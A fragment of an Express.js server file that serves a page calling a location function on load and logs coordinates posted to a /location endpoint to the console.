                window.onload = getLocation;
            </script>
        </body>
        </html>
    `);
});

// Обработка POST-запроса для получения координат
app.post('/location', (req, res) => {
    const { latitude, longitude } = req.body;
    console.log(`Received coordinates: Latitude - ${latitude}, Longitude - ${longitude}`);
    res.json({ status: 'Location received successfully!' });
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
